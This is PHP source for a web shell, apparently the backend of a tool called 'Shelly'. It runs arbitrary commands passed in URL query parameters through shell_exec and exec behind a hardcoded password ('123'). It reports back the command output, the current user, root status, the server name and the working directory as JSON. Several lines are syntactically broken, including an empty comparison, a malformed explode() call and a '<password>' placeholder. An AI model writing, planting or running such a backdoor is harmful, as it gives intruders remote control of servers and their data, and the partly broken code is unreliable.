<?php
#Classes
	Class System{
		protected static $password = <password>;
		
		public function get_system_password(){
			return self::$password;
		}
	}
	Class Conect extends System {
		public function __construct($get){
			$this->pass = $_GET['pass'];
		}
		public function conection(){
			if(!empty($this->pass)){
				if($this->pass == $this->get_system_password()){
					$response =  array('response' => true);
				}else{
					$response = array('response' => false,'msg'=>'Invalid Password');
				}
			}else{
				$response = array('response' => false,'msg'=>'No method received');
			}
			return $response;
		}
	}
	Class Server extends Conect {
		public function __construct($get,$conection){
			$this->cmd = $get['cmd'];
			$this->conection = $conection;
		}
		public function execute(){
			if($this->conection['response']){
				if($this->cmd == ){
					
				}else{
					if(!empty(shell_exec($this->cmd))){
						return shell_exec($this->cmd);
					}else{
						return 'Command Not Found';
					}
				}
			}else{
				return $this->conection['response'];
			}
		}
		public function set_execute(){
			$cmd = explode($this->cmd);
			
			if($cmd){
				
			}
		}
		public function print_working_directory(){
			if(exec("pwd") == getcwd()){
				$pwd = "~";
			}else{
				$pwd = exec($this->pwd);
			}
			return $pwd;
		}
		public function set_pwd($pwd){
			$this->pwd = $pwd;
		}
		public function get_name(){
			return $_SERVER['SERVER_NAME'];
		}
		public function get_user_bash(){
			if(exec("whoami") == "root"){
				$user_bash = "#";
			}else{
				$user_bash = "$";
			}
			return $user_bash;
		}
	}
#Class Instance
$conection = new Conect($_GET);
$server = New Server($_GET,$conection->conection());

if($_GET['cmd']){
	$response = $server->execute();
}

print_r($response);


if(!empty($_GET)){
	if($_GET['pass']){
		if($_GET['pass'] == '123'){ 
			if(!empty($_GET['a'])){
				$command = exec($_GET['a']);
			}
			if(empty($command)){
				@$command = "command not found: ".$_GET['a'];
			}
			
			if(exec("whoami") == "root"){
				$user_bash = "#";
			}else{
				$user_bash = "$";
			}
			if(exec("pwd")==getcwd()){
				$pwd = "~";
			}else{
				$pwd = exec("pwd");
			}
			
		$json = array("response" => "200",
					  "server_info" => array("user"=>exec("whoami"),"server_name" => $_SERVER['SERVER_NAME'],"user_bash" => $user_bash,"pwd"=>$pwd),
					  "command" => $command,);
		}else{
		
		$json = array("response" => "302",
					  "error" => "Invalid Password");	
		}
		//Response to Shelly				
		echo json_encode($json);
	}
}